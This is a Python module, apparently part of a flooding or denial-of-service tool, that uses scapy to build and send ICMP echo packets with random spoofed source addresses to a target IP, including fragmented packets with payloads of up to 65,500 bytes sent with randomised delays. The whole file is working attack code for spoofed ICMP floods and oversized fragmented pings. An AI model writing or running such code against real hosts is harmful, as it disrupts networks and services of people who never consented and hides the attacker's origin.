from scapy.all import IP, ICMP, fragment, send, RandIP, RandShort
from sys import path
path.append("..")
import packet_builder

def build_icmp_packet(destination_ip):
    """Generate ICMP ECHO request with spoofed source IP address.
    
    Argument:
    destination_ip -- the IP address of the target

    """
    return IP(src=RandIP(), dst=destination_ip, id=RandShort(), ttl=packet_builder.generate_ttl())/ICMP(id=RandShort())/packet_builder.generate_payload()

def build_fragmented_icmp_packet(destination_ip):
    """Generate fragmented ICMP packet with spoofed source IP address.
    
    Argument:
    destination_ip -- the IP address of the target

    """
    return fragment(IP(src=RandIP(), dst=destination_ip, id=RandShort(), ttl=packet_builder.generate_ttl())/ICMP(id=RandShort())/packet_builder.generate_payload(min_count=1500, max_count=65500), fragsize=packet_builder.generate_fragsize())

def send_icmp_packet(destination_ip):
    """Send ICMP ECHO request"""
    send(build_icmp_packet(destination_ip), inter=packet_builder.generate_delay())

def send_fragmented_icmp_packet(destination_ip):
    """Send fragmented ICMP packets"""
    for frag in build_fragmented_icmp_packet(destination_ip):
        send(frag, inter=packet_builder.generate_delay())